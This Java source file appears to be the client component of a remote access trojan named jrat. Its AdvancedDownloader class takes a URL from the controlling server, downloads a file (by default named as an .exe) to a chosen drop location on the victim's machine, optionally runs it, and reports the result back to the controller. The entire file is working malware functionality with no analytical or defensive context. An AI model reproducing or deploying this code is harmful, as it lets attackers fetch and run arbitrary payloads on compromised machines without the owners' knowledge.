package jrat.client;

import jrat.common.DropLocations;
import jrat.client.packets.outgoing.Packet27URLStatus;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.Random;

public class AdvancedDownloader extends Thread {

	private Connection con;
	private String url;
	private boolean exec;
	private int location;

	public AdvancedDownloader(Connection con, String url, boolean exec, int location) {
		this.con = con;
		this.url = url;
		this.exec = exec;
		this.location = location;
	}

	public void run() {
		try {
			con.addToSendQueue(new Packet27URLStatus(url, "Downloading"));
			File file = null;

			URLConnection ucon = new URL(url).openConnection();

			String fileName = (new Random().nextInt()) + ".exe";

			String disposition = ucon.getHeaderField("Content-Disposition");

			if (disposition != null) {
				int index = disposition.indexOf("filename=");
				if (index > 0) {
					fileName = disposition.substring(index + 10, disposition.length() - 1);
				}
			} else if (url.lastIndexOf(".") + 3 >= url.length()) {
				fileName = (new Random().nextInt()) + url.substring(url.lastIndexOf(".") + 1, url.length());
			}

			file = DropLocations.getFile(location, fileName);

			InputStream in = ucon.getInputStream();
			FileOutputStream fout = new FileOutputStream(file);
			byte data[] = new byte[1024];
			int count;
			while ((count = in.read(data, 0, 1024)) != -1) {
				fout.write(data, 0, count);
			}
			in.close();
			fout.close();

			if (this.exec) {
				Runtime.getRuntime().exec(new String[] { file.getAbsolutePath() });
				con.addToSendQueue(new Packet27URLStatus(url, "Executed"));
			} else {
				con.addToSendQueue(new Packet27URLStatus(url, "Downloaded"));
			}

		} catch (Exception ex) {
			ex.printStackTrace();

			con.addToSendQueue(new Packet27URLStatus(url, "Error: " + ex.getMessage()));
		}
	}

}
